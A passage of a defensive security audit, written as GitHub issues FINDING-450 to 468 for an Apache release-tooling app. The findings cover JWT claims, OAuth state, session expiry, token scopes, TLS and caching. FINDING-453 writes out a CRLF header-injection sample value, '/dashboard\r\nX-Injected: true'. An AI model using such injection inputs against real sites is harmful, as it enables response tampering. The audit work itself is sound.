- ASVS sections: 9.2.2
- CWE: CWE-1188

### Priority
Low

---

## Issue: FINDING-450 - GitHub OIDC `require` List Missing `aud`, `iss`, and `sub` Claims (Defense-in-Depth)

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The GitHub OIDC token verification function does not include "aud", "iss", or "sub" in the explicit `require` list within the `options` parameter, despite validating these claims via the `audience` and `issuer` parameters. PyJWT's `audience` and `issuer` parameters do enforce validation, so this is not currently exploitable. However, the explicit `require` list serves as defense-in-depth and makes the security intent unambiguous.

### Details
In `atr/jwtoken.py`:
- Line 158: GitHub OIDC verification
- Lines 165-170: Missing "aud", "iss", "sub" in require list

PyJWT's `audience` and `issuer` parameters do enforce validation of the `aud` and `iss` claims respectively. Additionally, the TrustedPublisherPayload Pydantic model defines `aud: str` as a required field, providing a second validation layer.

However, if a future PyJWT update changed the implicit enforcement behavior, or if the `audience`/`issuer` parameters were accidentally removed during code maintenance, the explicit `require` list would catch the gap.

This creates an inconsistency with the ATR JWT verification path which explicitly requires all critical claims.

### Recommended Remediation
Add "aud", "iss", and "sub" to the explicit `require` list for consistency with ATR's own JWT verification pattern and defense-in-depth:

```python
payload = jwt.decode(
    token,
    key=signing_key.key,
    algorithms=["RS256"],
    audience=_GITHUB_OIDC_AUDIENCE,
    issuer=_GITHUB_OIDC_ISSUER,
    options={"require": ["exp", "iat", "aud", "iss", "sub"]},
    #                                  ^^^^^^^^^^^^ ADDED
)
```

### Acceptance Criteria
- [ ] Add "aud", "iss", "sub" to require list
- [ ] Verify tokens missing these claims are rejected
- [ ] Unit tests for missing required claims
- [ ] Maintain consistency with ATR JWT verification

### References
- Source reports: L2:9.2.3.md, L2:9.2.4.md
- ASVS sections: 9.2.3, 9.2.4

### Priority
Low

---

## Issue: FINDING-451 - JWT TTL Documentation Discrepancy (30 Minutes Actual vs 90 Minutes Documented)

**Labels:** bug, security, priority:low, asvs-level:L1, asvs-level:L2

**ASVS Level(s):** L1, L2

**Description:**

### Summary
The JWT time-to-live (TTL) is hardcoded as 30 minutes (1,800 seconds) in `atr/jwtoken.py` line 40-43, but the authentication security documentation claims 90 minutes. While the code implements the more restrictive value (no security weakness), this discrepancy could cause confusion during security reviews, incorrect threat modeling assumptions, misleading incident response procedures, and compliance documentation errors.

### Details
- **Implementation:** `_ATR_JWT_TTL = 30 * 60` in `atr/jwtoken.py` lines 40-43
- **Documentation:** `atr/docs/authentication-security.md` states "Validity: 90 minutes from creation"
- **Impact:** Documentation mismatch creates operational confusion and audit discrepancies
- The 30-minute implementation is actually more secure than the documented 90 minutes

### Recommended Remediation
Update `atr/docs/authentication-security.md` to change "Validity: 90 minutes from creation" to "Validity: 30 minutes from creation" to align documentation with code implementation.

**Keep the 30-minute TTL in code** (more secure) rather than increasing to 90 minutes. The shorter lifetime reduces the exposure window for compromised tokens.

### Acceptance Criteria
- [ ] Documentation updated to reflect 30-minute JWT TTL
- [ ] Security documentation review confirms no other TTL discrepancies
- [ ] Unit test verifying JWT expiration occurs at 30 minutes

### References
- Source reports: L1:10.4.2.md, L1:10.4.3.md, L2:10.4.8.md
- Related findings: None
- ASVS sections: 10.4.2, 10.4.3, 10.4.8

### Priority
Low

---

## Issue: FINDING-452 - Process-Local OAuth State Storage Fails in Multi-Instance Deployments

**Labels:** bug, security, priority:low, asvs-level:L1, asvs-level:L2

**ASVS Level(s):** L1, L2

**Description:**

### Summary
OAuth state parameters are stored in a process-local dictionary (`pending_states = {}`) rather than shared storage. In multi-instance or load-balanced deployments, if the OAuth callback request is routed to a different instance than the one that initiated the flow, the state lookup will fail, causing authentication denial. This is an availability concern rather than a security vulnerability.

### Details
- **Location:** `src/asfquart/generics.py` lines 38-40
- **Issue:** In-memory dictionary cannot be shared across instances
- **Impact:** OAuth callback fails if routed to different instance than initiator
- **Documentation:** Documented in `docs/oauth.md` and tracked in GitHub issue infrastructure-asfquart#52

### Recommended Remediation
For production multi-instance deployments:

**Option 1 (preferred):** Use shared state store (e.g., Redis) with TTL-based expiry:
```python
redis_client.setex(f'oauth_state:{state}', workflow_timeout, json.dumps(state_data))
```

**Option 2:** Configure session-affinity (sticky sessions) at load balancer based on session cookie.

**Option 3:** Continue single-instance deployment if scale requirements allow.

### Acceptance Criteria
- [ ] Deployment configuration documented for multi-instance scenarios
- [ ] Integration test verifying OAuth flow across multiple instances (if applicable)
- [ ] Session affinity or shared storage implemented if multi-instance deployment required

### References
- Source reports: L1:10.4.2.md, L1:10.4.4.md, L2:10.4.7.md
- Related findings: None
- ASVS sections: 10.4.2, 10.4.4, 10.4.7

### Priority
Low

---

## Issue: FINDING-453 - Redirect URI Validation Lacks Newline/Control Character Filtering

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The redirect URI validation only checks the prefix (starts with `/`, not `//`). A value like `/dashboard\r\nX-Injected: true` passes validation but contains CRLF characters. Modern Werkzeug (≥2.3) mitigates this by rejecting header values containing \r, \n, or \x00, but the OAuth flow lacks explicit validation. If the Werkzeug version is downgraded or the framework-level check bypassed, HTTP response header injection becomes possible.

### Details
- **Affected locations:**
  - `src/asfquart/generics.py` lines 55-62 (login)
  - `src/asfquart/generics.py` lines 117-122 (logout)
  - `src/asfquart/generics.py` lines 73-80 (callback)
- **Current validation:** Only prefix checking
- **Missing:** Control character filtering
- **Mitigating factor:** Werkzeug ≥2.3 rejects malformed headers at framework level

### Recommended Remediation
Add control character validation to redirect URI validation function:

```python
import re
_INVALID_REDIRECT_CHARS = re.compile(r'[\x00-\x1f\x7f]')

def _validate_redirect_uri(uri: str) -> bool:
    if not uri.startswith('/') or uri.startswith('//'):
        return False
    if _INVALID_REDIRECT_CHARS.search(uri):
        return False
    return True
```

Apply this validation consistently to all redirect URI parameters in login, logout, and OAuth callback flows.

### Acceptance Criteria
- [ ] Control character validation added to redirect URI validation
- [ ] Unit tests verify rejection of CRLF sequences in redirect URIs
- [ ] All three flows (login, logout, callback) use consistent validation
- [ ] Unit test verifying the fix

### References
- Source reports: L1:10.4.1.md
- Related findings: FINDING-270
- ASVS sections: 10.4.1

### Priority
Low

---

## Issue: FINDING-454 - OAuth State Timeout (15 Minutes) Exceeds Authorization Code Best Practice Window

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The OAuth `workflow_timeout` parameter is configured at 900 seconds (15 minutes). While this controls the state parameter timeout and NOT the authorization code lifetime itself, it creates a 15-minute window during which ATR will accept an OAuth callback. ASVS 10.4.3 recommends authorization codes should not live longer than 10 minutes for L1/L2 applications. The actual authorization code lifetime is enforced server-side by `oauth.apache.org`, not by ATR.

### Details
- **Configuration:** `workflow_timeout = 900` (15 minutes) in `src/asfquart/generics.py` lines 16 and 95
- **ASVS recommendation:** 10 minutes for L1/L2
- **Note:** ATR cannot control the authorization code lifetime directly; this is managed by `oauth.apache.org`
- **Impact:** ATR's state window exceeds best practices, though actual code lifetime is externally managed

### Recommended Remediation
Consider reducing `workflow_timeout` to 600 seconds (10 minutes) to align ATR's state window with ASVS guidance:

```python
def setup_oauth(app, uri=DEFAULT_OAUTH_URI, workflow_timeout: int = 600):
```

Additionally, coordinate with the ASF OAuth service team to confirm the actual authorization code lifetime enforced by `oauth.apache.org` and document any variance from ASVS 10.4.3 recommendations as an accepted architectural risk.

### Acceptance Criteria
- [ ] Workflow timeout reduced to 10 minutes or documented exception created
- [ ] Coordination with ASF OAuth team documented
- [ ] Actual authorization code lifetime verified and documented
- [ ] Unit test verifying the fix

### References
- Source reports: L1:10.4.3.md
- Related findings: FINDING-458
- ASVS sections: 10.4.3

### Priority
Low

---

## Issue: FINDING-455 - Pagination Offset Validation Never Executes Due to Typo

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The pagination validation function contains a typo in the attribute name check: `if hasattr(query_args, 'offest'):` instead of `'offset'`. This causes offset validation to be silently skipped for all paginated API endpoints. Attackers can force expensive database queries with very large offset values. Impact is limited by correct limit validation (max 1000), public data only, and database query optimizer handling.

### Details
- **Location:** `atr/api/__init__.py` line 710
- **Typo:** `'offest'` should be `'offset'`
- **Impact:** Resource exhaustion risk with arbitrarily large offset values
- **Mitigating factors:**
  - Correct limit validation (max 1000)
  - Public data only (no authorization bypass)
  - Database query optimizer handling

### Recommended Remediation
Fix the typo on line 710:

**Change:** `if hasattr(query_args, 'offest'):`  
**To:** `if hasattr(query_args, 'offset'):`

Add unit tests to verify offset validation:
1. Test maximum offset enforcement (>1000000 rejected)
2. Test negative offset rejection
3. Test valid offset acceptance

### Acceptance Criteria
- [ ] Typo corrected in `atr/api/__init__.py` line 710
- [ ] Unit tests added for offset validation (max, negative, valid)
- [ ] Integration test added to prevent regression
- [ ] Unit test verifying the fix

### References
- Source reports: L1:10.4.5.md
- Related findings: None
- ASVS sections: 10.4.5

### Priority
Low

---

## Issue: FINDING-456 - No Expiry Cleanup for Stale OAuth State Entries (Memory Leak)

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Expired state entries are only cleaned up when specifically looked up during a callback. If a user initiates an OAuth flow but never completes the callback, the state entry remains in the dictionary indefinitely until process restart, causing gradual memory growth. With ~200 bytes per entry, 1000 abandoned flows would leak ~200 KB. This is a resource leak rather than a security vulnerability, but could impact long-running processes in high-traffic scenarios.

### Details
- **Location:** `src/asfquart/generics.py` line 40 (dictionary), lines 87-93 (cleanup logic)
- **Issue:** No proactive cleanup of expired state entries
- **Impact:** Memory leak in long-running processes with high OAuth flow initiation rate
- **Severity calculation:** ~200 bytes per entry × 1000 abandoned flows = ~200 KB

### Recommended Remediation
Implement periodic cleanup mechanism:

**Option 1:** Add async background task that runs every 5 minutes to clean expired states:
```python
async def _cleanup_expired_states():
    current_time = time.time()
    expired = [s for s, d in pending_states.items() if d['timestamp'] < (current_time - workflow_timeout)]
    for state in expired:
        pending_states.pop(state, None)
```

**Option 2:** Probabilistic cleanup on each request (e.g., 10% of requests trigger cleanup).

**Option 3:** Migrate to Redis with automatic TTL-based expiry.

### Acceptance Criteria
- [ ] Periodic cleanup mechanism implemented
- [ ] Memory leak test confirms cleanup occurs
- [ ] Unit test verifying the fix

### References
- Source reports: L2:10.4.7.md
- Related findings: FINDING-452
- ASVS sections: 10.4.7

### Priority
Low

---

## Issue: FINDING-457 - ASFQuart Session Absolute Expiration Disabled by Default

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
ASFQuart's `MAX_SESSION_AGE` configuration defaults to 0, which disables absolute session lifetime enforcement at the framework level. Without explicit configuration, a session accessed at least once every 7 days (sliding inactivity timeout) could persist indefinitely from ASFQuart's perspective. This is mitigated by ATR's additional enforcement via `ABSOLUTE_SESSION_MAX_SECONDS` (72 hours default) in a `before_request` hook in `server.py`, but framework-level protection would provide defense-in-depth.

### Details
- **Location:** `src/asfquart/session.py` lines 45, 51-52, 56, 99
- **Default value:** `MAX_SESSION_AGE = 0` (disabled)
- **Current enforcement:** ATR's application-level `before_request` hook enforces 72-hour absolute maximum
- **Gap:** Framework-level enforcement disabled
- **Defense-in-depth concern:** Application hook could fail or be bypassed

### Recommended Remediation
Configure ASFQuart session absolute expiration for defense-in-depth:

Add `app.cfg['MAX_SESSION_AGE'] = 72 * 3600` (72 hours) to application configuration.

This provides:
- Framework-level enforcement independent of application hooks
- Ensures expiration even if `before_request` hook fails or is bypassed
- Aligns with ATR's documented `ABSOLUTE_SESSION_MAX_SECONDS` policy

### Acceptance Criteria
- [ ] `MAX_SESSION_AGE` configured to 72 hours in application setup
- [ ] Session expiration verified at framework level
- [ ] Integration test confirms both framework and application-level expiration
- [ ] Unit test verifying the fix

### References
- Source reports: L2:10.4.8.md
- Related findings: None
- ASVS sections: 10.4.8

### Priority
Low

---

## Issue: FINDING-458 - Admin Bulk Token Revocation Does Not Notify Affected User

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
When an admin revokes all tokens for a user via the `/admin/revoke-user-tokens` endpoint, the affected user receives no email notification. This is inconsistent with the individual token deletion flow, which does send notifications. In incident response scenarios (e.g., suspected compromise), the affected user is not notified, delaying their awareness that action was taken on their account. The audit log captures the event, but the user must proactively check to discover the revocation.

### Details
- **Location:** `atr/storage/writers/tokens.py` lines 170-186
- **Issue:** `revoke_all_user_tokens()` does not send email notification
- **Comparison:** Individual token deletion flow sends notifications
- **Impact:** User unaware of administrative action on their account

### Recommended Remediation
Add email notification to the affected user in the `revoke_all_user_tokens()` function:

1. Send notification email to `{target_asf_uid}@apache.org`
2. Subject: 'ATR - All API Tokens Revoked'
3. Body: Inform user that an administrator has revoked all their tokens
4. Include the count of revoked tokens
5. Advise to contact ASF security if unexpected
6. Send after audit log write for proper sequencing

### Acceptance Criteria
- [ ] Email notification implemented in `revoke_all_user_tokens()`
- [ ] Email content includes count and security contact information
- [ ] Integration test verifies email sent after bulk revocation
- [ ] Unit test verifying the fix

### References
- Source reports: L2:10.4.9.md
- Related findings: FINDING-459
- ASVS sections: 10.4.9

### Priority
Low

---

## Issue: FINDING-459 - Web-Issued JWTs Lack PAT Binding and Cannot Be Individually Revoked

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
JWTs issued through the web UI 'Generate JWT' button don't include the `atr_th` (PAT hash) claim. This means they cannot be individually revoked via PAT deletion and remain valid for their full 30-minute TTL even if an admin revokes all of a user's PATs. The only way to immediately invalidate them is JWT signing key rotation, which invalidates ALL JWTs for ALL users. Mitigating controls include 30-minute TTL, LDAP check for disabled accounts, admin key rotation capability, and rate limiting (10 requests per hour).

### Details
- **Locations:**
  - `atr/post/tokens.py` lines 34-41 (JWT generation without PAT binding)
  - `atr/jwtoken.py` lines 116-128 (JWT issuance)
- **Missing claim:** `atr_th` (PAT hash) not included in web-issued JWTs
- **Impact:** 30-minute window during which web-issued JWTs remain valid after PAT revocation
- **Mitigating factors:**
  - 30-minute TTL limits exposure
  - LDAP check rejects JWTs for disabled accounts
  - Admin can rotate JWT signing key (global invalidation)
  - JWT generation rate-limited to 10 requests per hour

### Recommended Remediation
This is an acceptable architectural trade-off given the mitigations. If stronger revocation is needed in the future:

**Option 1:** Bind web-issued JWTs to a PAT by creating an ephemeral PAT for JWT binding in `jwt_post()` and passing its hash to `jwtoken.issue()`.

**Option 2:** Add server-side JWT tracking (blocklist) by storing JWT IDs in Redis/database for revoked tokens and checking the blocklist during verification.

**Short-term:** Add documentation note about the 30-minute window for non-PAT-bound JWTs in `atr/docs/authentication-security.md`.

### Acceptance Criteria
- [ ] Documentation updated to describe JWT revocation limitations
- [ ] Decision documented: accept current risk or implement Option 1/2
- [ ] If implementing binding: ephemeral PAT creation tested
- [ ] Unit test verifying the fix

### References
- Source reports: L2:10.4.9.md
- Related findings: FINDING-458, FINDING-460
- ASVS sections: 10.4.9

### Priority
Low

---

## Issue: FINDING-460 - ATR JWTs Have No Scope Claims — All API Access is Uniform

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
ATR's JWTs contain no `scope` or permission claims. A JWT obtained for any purpose grants identical bearer access to every JWT-protected endpoint (upload releases, delete releases, modify policies, manage keys, etc.). While RBAC in the storage layer enforces authorization per-operation, the token itself carries no scope restriction. If a JWT is compromised, the attacker has full API access as that user for the token's lifetime (30 minutes), rather than access limited to the operation the token was intended for.

### Details
- **Locations:**
  - `atr/jwtoken.py` lines 65-78 (token generation)
  - `atr/jwtoken.py` lines 109-133 (token issuance)
  - `atr/jwtoken.py` lines 188-207 (token verification)
  - `atr/storage/writers/tokens.py` lines 95-122 (PAT to JWT exchange)
- **Missing:** Scope claims in JWT payload
- **Impact:** Compromised JWT grants full API access rather than limited scope
- **Mitigation:** 30-minute TTL limits exposure window

### Recommended Remediation
Add `scopes` parameter to `issue()` function and include scope claim in JWT payload using RFC 8693 format:

```python
payload['scope'] = ' '.join(scopes)
```

1. Validate scopes in `require()` decorator to enforce token-level scope restrictions
2. Update API endpoints to use scope-restricted decorators like `@jwtoken.require('release:write')`
3. Design scope claim structure (e.g., `release:read`, `release:write`, `key:manage`, `policy:write`)
4. Example validation: `token_scopes = set(claims.get('scope', '').split())`

### Acceptance Criteria
- [ ] Scope claim design documented
- [ ] `issue()` function accepts and includes scope parameter
- [ ] `require()` decorator validates scopes
- [ ] API endpoints updated to use scope-restricted decorators
- [ ] Unit test verifying the fix

### References
- Source reports: L2:10.4.11.md
- Related findings: FINDING-271, FINDING-461, FINDING-459
- ASVS sections: 10.4.11

### Priority
Low

---

## Issue: FINDING-461 - PATs Have No Scope Limitation

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Personal Access Tokens (180-day validity) have no scope or permission restriction. Any PAT can be exchanged for a JWT that grants full API access. There is no mechanism to create a PAT limited to specific operations (e.g., read-only, upload-only, ci-only). A long-lived credential (180 days) with full permissions increases the blast radius of credential compromise. If a CI/CD PAT is compromised, the attacker has full API access rather than just upload permissions.

### Details
- **Locations:**
  - `atr/storage/writers/tokens.py` lines 67-74 (PAT creation)
  - `atr/storage/writers/tokens.py` lines 95-122 (PAT to JWT exchange)
  - `atr/storage/readers/tokens.py` lines 28-40 (PAT retrieval)
- **Missing:** Scope field in PAT model
- **Impact:** Long-lived credentials (180 days) grant full API access
- **Risk:** Higher blast radius for compromised CI/CD tokens

### Recommended Remediation
1. Add `scopes` field to `PersonalAccessToken` model to store space-separated scope list (e.g., 'release:write release:read')

2. Update `add_token()` to accept optional `scopes` parameter:
```python
async def add_token(self, token_hash: str, created: datetime.datetime, 
                   expires: datetime.datetime, label: str | None, 
                   scopes: list[str] | None = None)
```

3. Propagate scopes to JWT in `issue_jwt()` by parsing scopes from PAT and passing to `jwtoken.issue()`

4. Allow users to specify scopes when creating PATs via UI/API

### Acceptance Criteria
- [ ] PAT model updated with scopes field
- [ ] `add_token()` accepts scopes parameter
- [ ] UI allows scope selection during PAT creation
- [ ] Scopes propagated to JWTs during exchange
- [ ] Unit test verifying the fix

### References
- Source reports: L2:10.4.11.md
- Related findings: FINDING-271, FINDING-460
- ASVS sections: 10.4.11

### Priority
Low

---

## Issue: FINDING-462 - Session Cookies Signed But Not Encrypted — Documentation Claims Encryption

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Documentation in `docs/sessions.md` incorrectly states that session cookies are 'encrypted to ensure authenticity', when they are actually only cryptographically signed using `itsdangerous.URLSafeTimedSerializer`. Session contents are base64-encoded and readable to anyone possessing the cookie. While HMAC signing protects integrity and prevents tampering (satisfying ASVS 11.3.3 integrity requirements), session data is not confidential. This documentation mismatch could lead developers to store sensitive data in sessions under false assumptions of confidentiality.

### Details
- **Documentation:** `docs/sessions.md` line 2 claims encryption
- **Implementation:** `src/asfquart/base.py` lines 118-137, `src/asfquart/session.py`
- **Actual security:** HMAC signing (authentication + integrity), NOT encryption (confidentiality)
- **Impact:** Developer may mistakenly store sensitive data in sessions assuming encryption
- **Session contents:** base64-encoded, readable without decryption

### Recommended Remediation

**Option 1 (Recommended):** Update documentation to accurately describe the security model:

```markdown
## Session Security

OAuth user sessions are **cryptographically signed** using HMAC-SHA256 to ensure integrity and authenticity. Session data is transmitted over HTTPS and protected with HttpOnly, Secure, and SameSite=Strict flags to prevent JavaScript access and CSRF attacks.

**Important:** Session contents are base64-encoded but not encrypted. Do not store highly sensitive data (e.g., raw passwords, financial data, PII beyond what's necessary for authentication) in sessions. Only store:
- User identifier (UID)
- Authentication status
- Session metadata (creation time, expiration)
- Non-sensitive user attributes (display name, email for ASF members)
```

**Option 2 (Alternative):** Implement encrypted sessions using Fernet or server-side session storage.

### Acceptance Criteria
- [ ] Documentation updated to accurately describe signing vs encryption
- [ ] Guidelines added for what data should/should not be stored in sessions
- [ ] Unit test verifying the fix

### References
- Source reports: L2:11.3.3.md
- Related findings: None
- ASVS sections: 11.3.3

### Priority
Low

---

## Issue: FINDING-463 - Server Does Not Enforce Cipher Suite Preference Order

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The Apache TLS configuration uses `SSLHonorCipherOrder off`, which allows the client to choose the cipher suite from the server's offered list. ASVS 12.1.2 states cipher suites should have 'the strongest cipher suites set as preferred.' With client-side preference, a client could select a 128-bit AES cipher over a 256-bit cipher. However, practical security impact is minimal because: (1) all listed cipher suites provide forward secrecy, (2) all use AEAD modes, (3) no weak or legacy ciphers are present, and (4) this matches Mozilla's current 'Intermediate' configuration guidance.

### Details
- **Configuration:** `SSLHonorCipherOrder off` in `tooling-vm-ec2-de.apache.org.yaml`
- **Documentation:** `atr/docs/tls-security-configuration.md` explicitly justifies this choice for mobile device optimization
- **ASVS requirement:** Strongest cipher suites should be preferred (12.1.2)
- **Practical impact:** Minimal - all available ciphers are strong
- **Industry practice:** Mozilla's 'Intermediate' profile also uses client preference

### Recommended Remediation

If strict ASVS L2 compliance is required, enable server cipher preference with strongest ciphers first:

```apache
SSLHonorCipherOrder on
SSLCipherSuite ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256
```

**Note:** Mozilla's current 'Intermediate' configuration (used by millions of sites) also uses `SSLHonorCipherOrder off`. The current configuration represents industry best practice. If you choose to enable server preference, verify mobile client compatibility (ChaCha20 performance).

Consider accepting this as a documented exception with business justification: 'Client preference enabled to optimize mobile performance per Mozilla Intermediate profile.'

### Acceptance Criteria
- [ ] Decision documented: enable server preference or accept as exception
- [ ] If enabling server preference: mobile client compatibility verified
- [ ] TLS configuration testing confirms expected cipher selection
- [ ] Unit test verifying the fix

### References
- Source reports: L2:12.1.2.md
- Related findings: None
- ASVS sections: 12.1.2

### Priority
Low

---

## Issue: FINDING-464 - Missing .dockerignore for Build Context Optimization

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The builder stage uses `COPY . .` (line 23 of Dockerfile.alpine), which sends the entire build context — including `.git` and `.svn` directories — to the Docker daemon and into the builder layer. While the multi-stage selective copy ensures these do not reach the final image, a `.dockerignore` file would provide additional defense-in-depth benefits. Larger build contexts slow down builds (especially in CI/CD), builder images if accidentally pushed contain full source history, and intermediate layers consume more storage.

### Details
- **Location:** `Dockerfile.alpine` line 23 (`COPY . .`)
- **Missing file:** `.dockerignore` not provided in repository root
- **Impact:** 
  - Slower builds due to larger context
  - Builder images contain source control history if accidentally pushed
  - Intermediate layers consume unnecessary storage
- **Note:** Final image does NOT contain `.git` or `.svn` (no ASVS 13.4.1 violation)
- **Constraint:** Current build requires `.git` for `make generate-version` (line 27)

### Recommended Remediation

**⚠️ Important:** The current build requires `.git` for `make generate-version`. Choose one option:

**Option 1: Add .dockerignore (most cases)**
Create `.dockerignore` but note this will break version generation unless Option 2 or 3 is also implemented.

**Option 2: Pass Version as Build Argument (Recommended for CI/CD)**
```dockerfile
ARG APP_VERSION=dev
RUN apk add --no-cache make patch  # git removed
RUN echo "APP_VERSION='${APP_VERSION}'" > atr/version.py
```

Build command:
```bash
docker build --build-arg APP_VERSION=$(git describe --tags) -t atr .
```

**Option 3: Hybrid Approach**
Use .dockerignore but mount .git for version generation:
```dockerfile
RUN --mount=type=bind,source=.git,target=/tmp/git \
    git --git-dir=/tmp/git describe --tags > /tmp/version.txt && \
    echo "APP_VERSION='$(cat /tmp/version.txt)'" > atr/version.py
```

### Acceptance Criteria
- [ ] `.dockerignore` created or version generation updated per Option 2/3
- [ ] Build succeeds with correct version information
- [ ] Final image verified not to contain `.git` or `.svn`
- [ ] Build context size reduced in CI/CD metrics
- [ ] Unit test verifying the fix

### References
- Source reports: L1:13.4.1.md
- Related findings: None
- ASVS sections: 13.4.1

### Priority
Low

---

## Issue: FINDING-465 - OAuth Authorization Code Sent in URL Query String to Token Endpoint

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The OAuth authorization code is transmitted to the ASF token endpoint via a GET request with the code as a URL query parameter, rather than in an HTTP POST body as recommended by RFC 6749 Section 4.1.3 and OAuth 2.0 Security Best Current Practice (RFC 9700). The authorization code will be recorded in access logs on oauth.apache.org, any intermediate proxy/load balancer logs, and network monitoring tools. This appears to be an upstream API constraint from the ASF OAuth service. Multiple mitigating factors reduce the risk: server-to-server back-channel, HTTPS transport, single-use token with 900s expiration, Referrer-Policy headers, and ATR request logs exclude query strings.

### Details
- **Locations:**
  - `atr/server.py` line 67
  - `src/asfquart/generics.py` lines 14, 94
- **Issue:** Authorization code in URL query parameter
- **RFC recommendation:** POST request with code in body (RFC 6749 Section 4.1.3, RFC 9700)
- **Logging exposure:** Code appears in oauth.apache.org access logs, proxy logs, monitoring tools
- **Mitigating factors:**
  - Server-to-server back-channel (not exposed to browser)
  - HTTPS transport security
  - Single-use token with 900s expiration
  - Referrer-Policy headers prevent leakage
  - ATR request logs exclude query strings

### Recommended Remediation

**Option 1 (Recommended if supported):** Switch to POST method for token exchange.

Replace GET request with POST request sending the authorization code in the request body using `application/x-www-form-urlencoded` format with `grant_type=authorization_code` and `code` parameter.

**Contact ASF OAuth service maintainers** to confirm POST support.

**Option 2 (If POST not supported):** Document the accepted risk with inline code comments explaining:
- OAuth authorization code sent via GET query parameter due to upstream ASF OAuth endpoint constraint
- Mitigating factors: server-to-server HTTPS communication, single-use codes with 900s expiration, immediate exchange, query string exclusion from request logs

### Acceptance Criteria
- [ ] Coordination with ASF OAuth team documented
- [ ] POST method implemented if supported, OR
- [ ] Risk acceptance documented with inline comments
- [ ] Unit test verifying the fix

### References
- Source reports: L1:14.2.1.md
- Related findings: None
- ASVS sections: 14.2.1

### Priority
Low

---

## Issue: FINDING-466 - JWT DOM Auto-Clear Lacks Page Lifecycle Event Handlers

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The JWT display functionality on `/tokens` implements a 60-second auto-clear timer, which is a good security practice. However, it lacks page lifecycle event handlers that would provide defense-in-depth by clearing the JWT when: user switches tabs (visibilitychange), page enters back-forward cache (pagehide), or user navigates away before timer expires. If the page is stored in the browser's back-forward cache (bfcache), the timer may not fire when the user navigates back, and the JWT could persist in the DOM.

### Details
- **Location:** `atr/static/ts/create-a-jwt.ts` lines 28-50
- **Current implementation:** 60-second timer-based cleanup
- **Missing:** Page lifecycle event handlers
- **Risk:** JWT persists in DOM if:
  - User navigates away before 60-second timer expires
  - Page enters browser's back-forward cache
  - User returns via back button

### Recommended Remediation

Add to `atr/static/ts/create-a-jwt.ts`:

1. **`clearJwtDisplay()` function** to clear output, outputContainer, and both timeoutObj and intervalObj

2. **`visibilitychange` event listener** to call `clearJwtDisplay()` when `document.visibilityState` becomes 'hidden'

3. **`pagehide` event listener** to call `clearJwtDisplay()` when page is being unloaded or cached

4. **`pageshow` event listener** to call `clearJwtDisplay()` when page is restored from bfcache (`event.persisted === true`)

### Acceptance Criteria
- [ ] `clearJwtDisplay()` helper function implemented
- [ ] `visibilitychange` event handler added
- [ ] `pagehide` event handler added
- [ ] `pageshow` event handler added
- [ ] Manual testing confirms JWT cleared on tab switch and navigation
- [ ] Unit test verifying the fix

### References
- Source reports: L1:14.3.1.md
- Related findings: None
- ASVS sections: 14.3.1

### Priority
Low

---

## Issue: FINDING-467 - No `Cache-Control: no-store` on Authenticated Responses

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
Authenticated pages are not served with `Cache-Control: no-store`, meaning browsers may cache the full HTML response to disk. Even when `Clear-Site-Data` is sent on logout, the browser could have already persisted pages to disk cache before the logout occurred. `Cache-Control: no-store` provides defense-in-depth by preventing authenticated content from being written to cache in the first place. This reduces effectiveness of `Clear-Site-Data` implementation, since browser cache clearing behavior varies across implementations and some browsers may not fully honor `Clear-Site-Data` for disk cache.

### Details
- **Location:** `atr/server.py` lines 403-413 (`add_security_headers` function)
- **Missing:** `Cache-Control: no-store` on authenticated responses
- **Current protection:** `Clear-Site-Data` header on logout
- **Gap:** Authenticated content may be written to disk cache before logout
- **Impact:** Browser cache behavior varies; some may not fully honor `Clear-Site-Data`

### Recommended Remediation

Modify `add_security_headers` function in `atr/server.py` to add Cache-Control headers for authenticated responses:

1. Check if user is authenticated by reading the session
2. If authenticated and the request path is not `/auth` or `/static/*`, add the following headers:
   - `Cache-Control: no-store, no-cache, must-revalidate`
   - `Pragma: no-cache` (for HTTP/1.0 compatibility)
   - `Expires: 0` (for proxies)

**Alternative:** Apply to all non-static content regardless of authentication status (more aggressive approach).

### Acceptance Criteria
- [ ] `Cache-Control: no-store` added to authenticated responses
- [ ] Static resources excluded from no-store directive
- [ ] Browser testing confirms no disk caching of authenticated pages
- [ ] Unit test verifying the fix

### References
- Source reports: L1:14.3.1.md
- Related findings: None
- ASVS sections: 14.3.1

### Priority
Low

---

## Issue: FINDING-468 - Admin Debug Test Route /admin/raise-error Available in Production

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The `/admin/raise-error` route is explicitly a test route designed to deliberately trigger error handling for debugging purposes. While it requires admin authentication, it lacks the `_require_debug_and_allow_tests()` check that other debug routes use, making it accessible in production environments. This can be used to probe error handling behavior and verify whether tracebacks are leaked.

